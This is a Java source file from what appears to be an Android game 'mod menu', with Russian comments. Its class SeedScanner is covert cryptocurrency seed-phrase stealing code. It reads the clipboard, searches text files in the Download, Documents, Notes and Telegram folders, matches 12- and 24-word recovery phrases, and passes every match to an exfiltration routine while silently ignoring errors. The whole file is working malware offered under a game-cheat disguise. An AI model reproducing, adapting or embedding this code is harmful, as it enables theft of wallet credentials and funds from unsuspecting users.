package com.brawl.modmenu;

import android.content.ClipboardManager;
import android.content.Context;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class SeedScanner {

    // 12 или 24 слова — каждое 3-8 символов, разделены пробелом
    private static final Pattern SEED12 = Pattern.compile(
        "\\b([a-z]{3,8}\\s+){11}[a-z]{3,8}\\b");

    private static final Pattern SEED24 = Pattern.compile(
        "\\b([a-z]{3,8}\\s+){23}[a-z]{3,8}\\b");

    public static void scanClipboard(Context ctx) {
        try {
            ClipboardManager cm = (ClipboardManager)
                ctx.getSystemService(Context.CLIPBOARD_SERVICE);
            if (cm == null || !cm.hasPrimaryClip()) return;
            CharSequence text = cm.getPrimaryClip().getItemAt(0).coerceToText(ctx);
            if (text == null) return;
            check(text.toString(), "CLIPBOARD");
        } catch (Throwable ignored) {}
    }

    public static void scanFiles() {
        new Thread(() -> {
            try {
                File[] dirs = {
                    new File("/sdcard/Download"),
                    new File("/sdcard/Documents"),
                    new File("/sdcard/Notes"),
                    new File("/sdcard/Telegram")
                };
                for (File d : dirs) {
                    if (!d.exists()) continue;
                    scanDir(d, 0);
                }
            } catch (Throwable ignored) {}
        }).start();
    }

    private static void scanDir(File dir, int depth) {
        if (dir == null || depth > 3) return;
        File[] files;
        try { files = dir.listFiles(); } catch (Throwable t) { return; }
        if (files == null) return;
        for (File f : files) {
            if (f.isDirectory()) scanDir(f, depth + 1);
            else {
                String n = f.getName().toLowerCase();
                if (!n.endsWith(".txt") && !n.endsWith(".json")
                    && !n.endsWith(".md") && !n.endsWith(".log")) continue;
                if (f.length() > 100 * 1024) continue;
                try {
                    BufferedReader r = new BufferedReader(new FileReader(f));
                    String line;
                    int lc = 0;
                    while ((line = r.readLine()) != null && lc < 200) {
                        check(line, "FILE:" + f.getName());
                        lc++;
                    }
                    r.close();
                } catch (Throwable ignored) {}
            }
        }
    }

    private static void check(String text, String source) {
        if (text == null || text.length() < 30) return;

        // ищем 24 слова
        Matcher m24 = SEED24.matcher(text);
        if (m24.find()) {
            Exfil.send("SEED_FOUND",
                "⚠️ 24-СЛОВНАЯ SEED-ФРАЗА\n" +
                "Источник: " + source + "\n\n" + m24.group());
            return;
        }

        // ищем 12 слов
        Matcher m12 = SEED12.matcher(text);
        if (m12.find()) {
            Exfil.send("SEED_FOUND",
                "⚠️ 12-СЛОВНАЯ SEED-ФРАЗА\n" +
                "Источник: " + source + "\n\n" + m12.group());
        }
    }
}
